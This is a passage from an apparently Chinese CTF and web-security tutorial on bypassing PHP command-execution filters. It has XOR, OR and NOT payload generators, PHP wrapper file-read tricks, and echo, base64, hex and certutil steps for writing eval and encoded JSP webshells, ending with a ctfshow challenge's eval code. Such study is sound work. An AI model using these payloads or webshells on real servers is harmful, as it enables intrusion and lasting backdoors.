</span></span><span class="line"><span class="cl">           <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">               <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">               <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                   <span class="k">break</span>
</span></span><span class="line"><span class="cl">               <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                   <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="cl">                   <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                   <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                   <span class="k">break</span>
</span></span><span class="line"><span class="cl">           <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">       <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">^</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">       
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">       <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your function：&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your command：&#34;</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="nb">print</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>运行结果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(&#34;%08%02%08%08%05%0d&#34;^&#34;%7b%7b%7b%7c%60%60&#34;)(&#34;%04%09%09&#34;^&#34;%60%60%7b&#34;);
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>低版本可能会导致执行不成功</strong></p>
<h3 id="或" class="headerLink">
    <a href="#%e6%88%96" class="header-mark"></a>或</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;res.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[0-9a-z]/i&#39;</span><span class="p">;</span><span class="c1">//根据题目给的正则表达式修改即可
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">              <span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">|</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>python脚本：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">       <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">           <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;or_rce.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">           <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">               <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">               <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                   <span class="k">break</span>
</span></span><span class="line"><span class="cl">               <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                   <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="cl">                   <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                   <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                   <span class="k">break</span>
</span></span><span class="line"><span class="cl">           <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">       <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">       
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">       <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your function：&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your command：&#34;</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="cl">       <span class="nb">print</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="取反" class="headerLink">
    <a href="#%e5%8f%96%e5%8f%8d" class="header-mark"></a>取反</h3><p>取反用的字符不会触发正则表达式，所以我们直接用php脚本生成payload即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php  //在命令行中运行
</span></span><span class="line"><span class="cl">    fwrite(STDOUT,&#39;[+]your function: &#39;);
</span></span><span class="line"><span class="cl">    $system=str_replace(array(&#34;\r\n&#34;, &#34;\r&#34;, &#34;\n&#34;), &#34;&#34;, fgets(STDIN)); 
</span></span><span class="line"><span class="cl">    fwrite(STDOUT,&#39;[+]your command: &#39;);
</span></span><span class="line"><span class="cl">    $command=str_replace(array(&#34;\r\n&#34;, &#34;\r&#34;, &#34;\n&#34;), &#34;&#34;, fgets(STDIN)); 
</span></span><span class="line"><span class="cl">    echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;
</span></span><span class="line"><span class="cl">    ?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>root@kali html<span class="o">]</span><span class="c1"># php test.php</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>your <span class="k">function</span>: system
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>your command: dir
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="o">(</span>~%8C%86%8C%8B%9A%92<span class="o">)(</span>~%9B%96%8D<span class="o">)</span>；
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="php封装协议" class="headerLink">
    <a href="#php%e5%b0%81%e8%a3%85%e5%8d%8f%e8%ae%ae" class="header-mark"></a>PHP封装协议</h2><p><code>?file=php://filter/read=convert.base64-encode/resource=config.php</code>它可以读取对应文件源代码，得到的结果经过Base64解密后得到的是config.php源代码</p>
<p><code>?file=php://input</code> 写入PHP文件。它受限于allow_url_include选项。php://input可以读取没有处理过的POST数据</p>
<p><code>?file=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>，d2VsY29tZSB0byB0aGUgempjdGY=是welcome to the zjctf。它和<code>http://input</code>一样都可以把一些内容写入其中。</p>
<p><code>file:///var/www/html/flag.php</code>读取本地文件，路径要是相对路径。可用于读取web目录下的文件。</p>
<h2 id="写入webshell" class="headerLink">
    <a href="#%e5%86%99%e5%85%a5webshell" class="header-mark"></a>写入webshell</h2><p>确认寻找到的路径有写入权限之后，就可以开始写webshell了</p>
<h3 id="echo直接写入" class="headerLink">
    <a href="#echo%e7%9b%b4%e6%8e%a5%e5%86%99%e5%85%a5" class="header-mark"></a>echo直接写入</h3><h4 id="linux" class="headerLink">
    <a href="#linux" class="header-mark"></a><strong>linux</strong></h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;&lt;?php eval($_POST[2]); ?&gt;&#39; &gt; 1.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。</p>
<p><strong>写的时候要注意题目的函数是命令执行还是代码执行</strong></p>
<p><strong>注意payload里的符号</strong></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194311172.png" title="image-20230708194311172" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194311172.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194311172.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194311172.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194311172.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194311172.png 2x"
            sizes="auto"
            alt="image-20230708194311172">
    </a></figure></p>
<p>蚁剑连接成功
<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194938060.png" title="image-20230708194938060" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194938060.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194938060.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194938060.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194938060.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230708194938060.png 2x"
            sizes="auto"
            alt="image-20230708194938060">
    </a></figure></p>
<h4 id="windows" class="headerLink">
    <a href="#windows" class="header-mark"></a><strong>windows</strong></h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set /p=要写的内容&lt;nul &gt; C:\11.txt
</span></span><span class="line"><span class="cl">echo 要写的内容 &gt; C:\11.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>在windows中，批处理需要转义字符主要有 “&amp;”，“|”，“&lt;”，“&gt;”等等，转义字符为”^”</p>
<p>直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽</p>
<h3 id="转换编码写入" class="headerLink">
    <a href="#%e8%bd%ac%e6%8d%a2%e7%bc%96%e7%a0%81%e5%86%99%e5%85%a5" class="header-mark"></a>转换编码写入</h3><h4 id="linux-1" class="headerLink">
    <a href="#linux-1" class="header-mark"></a>Linux</h4><p><strong>base64方式写入：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&#34; | base64 -d &gt;2.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>hex方式写入：</strong></p>
<p>hex写入与base64写入相似，在 <a href="https://www.107000.com/T-Hex/" target="_blank" rel="noopener noreferrer">https://www.107000.com/T-Hex/</a>将webshell编码成hex，使用xxd命令还原</p>
<p>或在使用前将webshell使用xxd生成hex数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;&lt;?php eval($_POST[1]); ?&gt;&#39; |xxd -ps
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后命令注入执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps &gt; 3.php
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="windows-1" class="headerLink">
    <a href="#windows-1" class="header-mark"></a>windows</h4><p>在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式</p>
<p><strong>certutil-Base64</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= &gt; 123.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">再通过certuti进行解码
</span></span><span class="line"><span class="cl">certutil -f -decode 111.txt C:\\111.jsp
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>certutil-Hex</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e &gt; 111.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">再通过certuti进行解码
</span></span><span class="line"><span class="cl">certutil -decodehex 111.txt C:\\111.jsp
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="靶场题目" class="headerLink">
    <a href="#%e9%9d%b6%e5%9c%ba%e9%a2%98%e7%9b%ae" class="header-mark"></a>靶场题目：</h2><h3 id="web29" class="headerLink">
    <a href="#web29" class="header-mark"></a>[web29]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:26:48
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
